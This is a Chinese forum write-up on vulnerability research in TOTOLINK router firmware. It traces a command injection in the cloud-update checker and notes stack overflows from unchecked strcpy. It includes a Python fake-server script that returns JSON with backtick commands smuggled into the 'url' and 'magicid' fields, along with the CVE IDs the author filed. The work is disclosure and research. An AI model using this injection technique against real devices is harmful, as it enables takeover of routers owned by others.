> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-273945.htm)

> [原创]totolink 路由器漏洞挖掘

TOTOLINK 漏洞挖掘
=============

学习路由器漏洞挖掘的知识有一段时间了，最常见的漏洞就是命令注入和栈溢出。前段时间正好分析了下 TOTOLINK 路由器，下面做一下分析过程的回顾。

 

为了后续 cve 提交不产生重复，同时快速的了解这款路由器，我选择从已有漏洞入手，通过 cve-list 查看存在的漏洞。

 

这里在搜索的时候，我是选择搜索当前分析版本 和 全版本的漏洞信息。这样查看的好处是，有些漏洞可能在其他版本里面已经提交了，但是在你分析的这个版本里面没有提交，通过对比分析，有机会快速收割。

 

比如下面的几个 cve，就是在不同版本下的。函数名称都是 setDeviceName，问题参数都是 devicename 和 devicemac  
![](https://bbs.pediy.com/upload/attach/202208/836421_NCTW7VAB8UM3A3B.png)  
![](https://bbs.pediy.com/upload/attach/202208/836421_DBE3YVENGQT6WZ3.png)

 

这里再插一嘴，cve-list 上面有些漏洞信息并不完整，比如漏洞没有指明具体的模块，查看的时候并不方便，这里可以使用 search and replace 工具根据函数名称定位到模块。  
![](https://bbs.pediy.com/upload/attach/202208/836421_UNF4B423AVRJVHK.png)

 

全版本搜索结果如下：  
![](https://bbs.pediy.com/upload/attach/202208/836421_A7WJU8MBY8MRHJD.png)  
![](https://bbs.pediy.com/upload/attach/202208/836421_5HCJS7MJBD2UXVM.png)  
从全版本的搜索结果可以看出存在大量命令注入类型的漏洞，溢出类型的漏洞比较少。  
找几个漏洞进去看一下，命令执行的漏洞基本都是 system 函数，popen 函数参数没有过滤导致的。溢出类型的漏洞基本都是 strcpy 导致的。

 

查看当前分析版本存在的漏洞  
![](https://bbs.pediy.com/upload/attach/202208/836421_XZ7XKKT8J3DQEYA.png)  
当前版本的漏洞基本都是以命令注入为主。

 

通过对已存在漏洞的查看，基本可以确定一下我们要分析的模块的范围：

 

1、\squashfs-root\lib\cste_modules\*

 

2、\squashfs-root\web_cste\cgi-bin\*

 

3、\squashfs-root\bin\*

 

下面就是一套常规的分析流程了

 

1、固件下载地址

 

https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/170/ids/36.html

 

当前最新版本为 V4.1.2cu.5247_B20211129，这里我们以 V4.1.2cu.5050_B20200504 为例

 

2、binwalk 解压

 

3、利用 ida 逐个的对目标文件进行分析，主要通过 ida 的交叉引用功能查找 system，execv，popen，strcpy，memcpy，sprintf 等函数的使用，这里有些 so 文件可能对这些函数进行了二次封装，在分析的时候也要注意这种函数的交叉引用情况。如：  
![](https://bbs.pediy.com/upload/attach/202208/836421_XMSJJAWNQUH9QSQ.png)

[](#命令注入漏洞：)命令注入漏洞：
-------------------

一段时间的检索分析之后，排除掉 cve-list 中已经存在的漏洞情况，在 \ squashfs-root\bin\cloudupdate_check 程序中发现了命令注入点。  
下面分析参数来源，判断是否可控。

 

system 函数的参数没有任何过滤直接执行，v13 来自于对 v6 的 snprintf，v6 来自于 对 a1 的 websGetvar("magicid"),a1 是函数 uci_cloudupdate_config 的参数。查看 uci_cloudupdate_config 的交叉引用情况，进行栈回溯分析，  
![](https://bbs.pediy.com/upload/attach/202208/836421_6RX688WF5KM3BP4.png)

 

v12 来自于 v9，v9 来自于 v5，v5 来自于 a2，a2 是 函数 parse_upgserver_info 的参数，这里能看到一个 “200 OK”，结合函数名称，可以猜测这里是对服务器返回的数据进行的解析处理，继续对 parse_upgserver_info 进行回溯分析  
![](https://bbs.pediy.com/upload/attach/202208/836421_9Z2RPEFJX6BXKPF.png)  
![](https://bbs.pediy.com/upload/attach/202208/836421_SBTXV8N9TTUZ7CS.png)

 

v19 的数据由 recv 函数获取，这个 v4 是个 socket 描述符，由 init_tcp_client 返回。  
![](https://bbs.pediy.com/upload/attach/202208/836421_9XH2JEQ3CN3X8B2.png)  
![](https://bbs.pediy.com/upload/attach/202208/836421_5X3CBAPHTMHQGV3.png)

 

查看 init_tcp_client 函数，这里地址转换函数使用了 v0，v0 来自于 byte_414180  
![](https://bbs.pediy.com/upload/attach/202208/836421_4QVRD2623PMCDTF.png)  
![](https://bbs.pediy.com/upload/attach/202208/836421_9CJZKPYAN9UQB5K.png)  
通过对 来自于 byte_414180 的交叉引用分析，得到服务器网址为 "update.carystudio.com"  
![](https://bbs.pediy.com/upload/attach/202208/836421_V7XB7AQU7X5EHNN.png)

 

也就是说数据实际来自于服务端的返回数据，如果能够控制服务端的返回数据，也就可以执行命令。

 

路由器抓包：

 

1、因为需要获取服务器的返回值，需要抓取数据包，这里通过 windows 主机开启热点，启动路由器的中继模式连接主机热点，通过抓取主机流量的方式，过滤获得路由器的数据包

 

路由器数据包如下：  
![](https://bbs.pediy.com/upload/attach/202208/836421_5N2AZX7HPZJBXST.png)

 

程序本身存在如下的一些校验，还需要修改 mode 字段以绕过校验

 

![](https://bbs.pediy.com/upload/attach/202208/836421_Y8458G2XSJM968H.png)

 

环境模拟步骤如下：

 

1、修改 windows hosts 文件，添加 192.168.0.112 update.carystudio.com 使得解析路径指向本地 ip

 

2、本地开启 80 端口，等待连接，python 脚本如下

```
import socket
 
sSock=socket.socket()
sSock.bind(('192.168.0.112',80))
sSock.listen(1000)
 
cSock,addr=sSock.accept()
 
if(True):
    str1=cSock.recv(1024)
    print("客户端说："+str1.decode('utf-8'))
 
 
    str2='''HTTP/1.1 200 OK
Server: nginx/1.4.6 (Ubuntu)
Date: Wed, 13 Apr 2022 12:50:54 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 98
Connection: close
 
{"mode":"1","url":"`ls -la`","magicid":"`ls`","version":"1","svn":"","plugin":[],"protocol":"3.0"}'''
    cSock.send(str2.encode())
 
cSock.close()
```

3、重启路由器

 

wireshark 抓取数据包内容如下  
![](https://bbs.pediy.com/upload/attach/202208/836421_8S652FNYEK6824C.png)

 

登陆后台可以发现，已成功写入文件 / tmp/ActionMd5 和 /tmp/DlFileUrl  
![](https://bbs.pediy.com/upload/attach/202208/836421_834YW3SNFS279SF.png)

 

另：一般这种确定应用程序的运行时机的方式，都是正向分析启动项；如果是模块程序的话，cgi-bin 这种的，就要分析服务端程序 (httpd,nginx) 的配置文件.

[](#栈溢出漏洞：)栈溢出漏洞：
-----------------

栈溢出漏洞就比较多了，大都是 strcpy 函数调用时没有校验长度导致的，查找过程也就是通过 ida 的交叉引用，查找 strcpy，sprintf，memcpy 等危险函数的调用，这里就不再赘述了。  
![](https://bbs.pediy.com/upload/attach/202208/836421_7PDQKYK5WXY7YKZ.png)

 

红框里面的数据是没有提交 cve 的，但是是存在溢出的，因为没有办法泄露 libc 的地址，无法进行进一步的利用，也就没再继续看了，感兴趣的小伙伴可以自己试试。

 

另：如果这里的程序是 cgi 程序，且你需要进行动态调试的话，可以先 gdb 附加 httpd ，再通过 set follow-fork-mode child；catch exec, 追踪子进程进行调试。

 

下面是这次挖掘提交的 cve：  
CVE-2022-29646，  
CVE-2022-29645，  
CVE-2022-29644，  
CVE-2022-29643，  
CVE-2022-29642，  
CVE-2022-29641，  
CVE-2022-29640，  
CVE-2022-29639，  
CVE-2022-29638

[恭喜 ID[飞翔的猫咪] 获看雪安卓应用安全能力认证高级安全工程师！！](https://mp.weixin.qq.com/s?src=11&timestamp=1659838130&ver=3967&signature=s6siC7hKil1wiaYVM8OGNqi79zQUdeCyW1TxoUpoK84v1ad8jvFOToeTvldyCoA8TKIlBSG1v2tginEMXvpjApaL4PVAL08iUQRuDhMz-aox2jpUAiSkr9s-EHsw88wi&new=1)

[#安全研究](forum-128-1-167.htm) [#固件分析](forum-128-1-170.htm) [#漏洞分析](forum-128-1-171.htm) [#漏洞挖掘](forum-128-1-178.htm) [#家用设备](forum-128-1-173.htm)